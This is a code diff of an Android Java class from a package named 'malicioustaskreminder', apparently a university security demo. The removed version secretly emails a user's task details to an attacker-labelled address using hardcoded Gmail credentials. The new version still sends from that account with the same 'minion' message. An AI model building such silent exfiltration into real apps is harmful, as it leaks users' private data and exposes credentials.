@@ -3,24 +3,23 @@ package edu.cmu.malicioustaskreminder;
 import android.os.AsyncTask;
 import android.util.Log;
 
-public class SendMailTask extends AsyncTask<TaskDetails, Void, Void> {
+public class ProperSendMailTask extends AsyncTask<ViewTask, Void, Void> {
 
 	@Override
-	protected Void doInBackground(TaskDetails... tasks) {
+	protected Void doInBackground(ViewTask... tasks) {
 		try {   
-			TaskDetails task = tasks[0];
-            MaliciousGmailSender sender = new MaliciousGmailSender("malicousattacker@gmail.com", "Qwertyuiop123");
+			ViewTask task = tasks[0];
+            GmailSender sender = new GmailSender("malicousattacker@gmail.com", "Qwertyuiop123");
             sender.sendMail("Greetings supreme master!!",   
-                    "Your unfortunate minion has added the following task:\n\n\t "+ "Details: "+task.getDescription()
+                    "Your unfortunate minion has added the following task:\n\n\t "+ "Details: "+task.getDescriptionString()
                     +"\n\t Date: " + task.getDateString() + "\n\t Start Time: " + task.getFromTimeString() +
                     "\n\t End Time: " + task.getToTimeString(),   
                     "malicousattacker@gmail.com",   
-                    "ramya201@gmail.com");   
+                    task.getFriendEmail());   
         } catch (Exception e) {   
             Log.e("SendMail", e.getMessage(), e);   
         } 
 		return (Void)null;
-		
 	}
-
+	
 }
